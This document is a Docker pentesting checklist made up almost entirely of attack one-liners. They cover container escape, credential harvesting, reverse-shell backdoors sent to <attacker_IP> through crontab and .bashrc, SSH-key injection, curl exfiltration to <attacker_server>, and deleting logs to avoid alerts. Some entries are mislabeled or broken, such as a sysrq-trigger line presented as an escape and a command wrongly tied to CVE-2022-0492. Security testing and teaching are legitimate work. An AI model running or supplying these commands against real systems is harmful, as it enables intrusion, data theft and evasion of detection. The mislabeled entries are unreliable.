Docker Pentesting Checklist

Reconnaissance

 List running containers: docker ps -a

 Inspect container details: docker inspect <container_id>

 Check for open Docker API ports: nmap -p 2375,2376 <target>

 Check for open Docker API ports using Metasploit: msfconsole -q -x "use auxiliary/scanner/docker/docker_daemon_api; set RHOSTS <target>; run"

 Enumerate Docker networks: docker network ls

 Inspect network details: docker network inspect <network_name>

 Identify mounted volumes: docker inspect <container_id> | jq '.[].Mounts'

 Look for sensitive files inside containers: docker exec -it <container_id> find / -name '*.pem' -o -name '*.key'

 Check for container logs: docker logs <container_id>

 Find Docker-related files in home directories: find /home -name ".docker" -type d -exec ls -la {} \;

 Check for exposed sensitive environment variables: env | grep -i 'secret\|password\|token'


Credential Gathering

 Extract environment variables: docker inspect <container_id> | jq '.[].Config.Env'

 Check for SSH keys: docker exec -it <container_id> ls -la /root/.ssh/

 Look for hardcoded credentials in images: docker history <image_name>

 Dump credentials from memory (if running as root): docker exec -it <container_id> cat /proc/<pid>/environ

 Check for misconfigured registry authentication: cat ~/.docker/config.json

 Dump Docker credentials stored in memory: strings /proc/$(pgrep dockerd)/environ | grep -i password

 Extract API credentials from running containers: docker exec -it <container_id> cat /root/.aws/credentials

 Check for hardcoded credentials inside layers of an image: docker save <image_name> | tar xf - && grep -r "password" .


Privilege Escalation

 Identify privileged containers: docker ps --filter "privileged=true"

 Check for root user inside the container: docker exec -it <container_id> whoami

 Abuse writable /etc/passwd: docker exec -it <container_id> vi /etc/passwd

 Exploit container escape vulnerabilities: docker exec -it <container_id> sh -c 'echo c > /proc/sysrq-trigger'

 Check for writable system directories: docker exec -it <container_id> ls -ld /root /etc /var

 Exploit --cap-add=SYS_ADMIN to gain host access: docker run --rm -it --cap-add=SYS_ADMIN -v /:/mnt alpine chroot /mnt sh

 Check for CAP_SYS_ADMIN (Common Privilege Escalation Path): docker inspect <container_id> | jq '.[].HostConfig.CapAdd'

 Exploit CVE-2022-0492 (Privileged Containers Escape to Host): mount -t proc /proc /mnt && chroot /mnt /bin/bash


Lateral Movement

 Check for Docker socket access: ls -la /var/run/docker.sock

 Use a compromised container to start new containers: docker run -it --rm <image_name> /bin/sh

 Access host filesystem via bind mounts: docker run -v /:/mnt --rm -it alpine chroot /mnt sh

 Escape container to host using --privileged: docker run --privileged -v /:/host alpine chroot /host sh

 Scan for other exposed Docker services: nmap -p 2375,2376 --open <subnet>

 Check for open Sockets & Exposed Services Inside Containers: docker exec -it <container_id> netstat -tulpn

 Pivot inside the network using a compromised container: docker run -it --network <network_name> --rm alpine sh


Persistence

 Create a rogue container with persistence: docker run -d --restart=always --name backdoor -v /:/mnt alpine chroot /mnt sh

 Modify container startup settings: docker update --restart=always <container_id>

 Add a malicious cron job inside a container: echo '* * * * * root /bin/bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1' >> /etc/crontab

 Inject a backdoor into an image: docker commit <container_id> backdoored_image && docker push <repo>/backdoored_image

 Add SSH keys to a running container: docker exec -it <container_id> bash -c 'echo "<attacker_pub_key>" >> ~/.ssh/authorized_keys'

 Hijack the container runtime (if malicious access is available): mv /usr/bin/docker /usr/bin/dockerd && ln -s /bin/bash /usr/bin/docker

Modify host's .bashrc to maintain access via reverse shell: echo 'bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1' >> /root/.bashrc

Inject a new service into an existing container: docker exec -it <container_id> sh -c "echo '* * * * * root nc -e /bin/sh <attacker_IP> 4444' >> /etc/crontab"


Exfiltration & Cleanup

 Extract sensitive files from a container: docker cp <container_id>:/etc/shadow ./shadow_dump

 Compress and exfiltrate logs: tar -czvf logs.tar.gz /var/log && curl -T logs.tar.gz <attacker_server>

 Find all logs across the container (including rotated logs): find /var/log -type f | xargs ls -lh

 Delete Docker logs without triggering alerts: truncate -s 0 $(docker inspect --format='{{.LogPath}}' <container_id>)



 Remove logs and traces: docker exec -it <container_id> sh -c 'rm -rf /var/log/*'

 Delete rogue containers: docker rm -f <container_id>

 Wipe container history: docker history -q <image_name> | xargs docker rmi -f

Resources


Dockerd Escape Testing:

https://github.com/cdk-team/CDK → Container escape toolkit

https://github.com/andrew-d/static-binaries → Statically compiled binaries for escaping restricted environments

https://github.com/jas502n/docker-escape-tool → Automated Docker escape testing

More Security Checklists:

MITRE ATT&CK - Docker Security → https://attack.mitre.org/matrices/enterprise/

CIS Docker Benchmark → https://www.cisecurity.org/benchmark/docker

GCP/AWS/EKS Container Security Guidelines → https://cloud.google.com/kubernetes-engine/docs/security-bulletins

